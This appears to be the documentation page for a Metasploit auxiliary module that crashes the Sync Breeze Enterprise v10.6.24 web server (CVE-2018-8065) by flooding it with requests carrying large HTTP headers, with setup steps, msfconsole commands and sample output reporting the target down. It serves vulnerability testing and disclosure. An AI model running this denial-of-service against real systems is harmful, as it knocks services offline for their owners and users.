## Description
This module triggers a Denial of Service vulnerability in the Sync Breeze Enterprise HTTP server. It is possible to trigger 
a write access memory vialation via rapidly sending HTTP requests with large HTTP header values.  


## Vulnerable Application 
According To publicly exploit Disclosure of Sync Breeze Enterprise v10.6.24
this software is vulnerable to Denial Of Service.
read more : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8065

**Vulnerable Application Link** 
http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.6.24.exe

## Vulnerable Application Installation Setup.
Download Application : ```http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.6.24.exe```

**And Follow Sync Breeze Enterprise v10.6.24 Setup Wizard**

After the installation navigate to: ```Options->Server```

Check the box saying: ```Enable web server on port:...```

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use auxiliary/dos/http/syncbreeze_enterprise_dos`
  4. Do: `set rport <port>`
  5. Do: `set rhost <ip>`
  6. Do: `check`
```
[*] 192.168.1.27:80 - Checking connection to 192.168.1.27:80
[+] 192.168.1.27:80 - Sync Breeze Enterprise v10.6.24 verified.
[+] 192.168.1.27:80 The target is vulnerable.
```
  7. Do: `run`
  8. Web server will crash after 200-1000 request depending on the OS version and system memory.

## Scenarios
**TESTED AGAINST WINDOWS 7/10**
```
msf5 > use auxiliary/dos/http/syncbreeze_enterprise_dos 
msf5 auxiliary(dos/http/syncbreeze_enterprise_dos) > set rhost 192.168.1.27
rhost => 192.168.1.27
msf5 auxiliary(dos/http/syncbreeze_enterprise_dos) > set rport 80
rport => 80
msf5 auxiliary(dos/http/syncbreeze_enterprise_dos) > run

[*] 192.168.1.27:80 - Checking connection to 192.168.1.27:80
[+] 192.168.1.27:80 - Sync Breeze Enterprise v10.6.24 verified.
[*] 192.168.1.27:80 - Sending HTTP DoS packets...
[*] 192.168.1.27:80 - Request size: (6667) byte
[*] 192.168.1.27:80 - Request size: (13990) byte
[*] 192.168.1.27:80 - Request size: (15797) byte
[*] 192.168.1.27:80 - Request size: (20369) byte
[*] 192.168.1.27:80 - Request size: (11119) byte
[*] 192.168.1.27:80 - Request size: (16293) byte
[*] 192.168.1.27:80 - Request size: (13830) byte
...
[+] 192.168.1.27:80 - DoS successful 192.168.1.27 is down !
[*] Auxiliary module execution completed

```
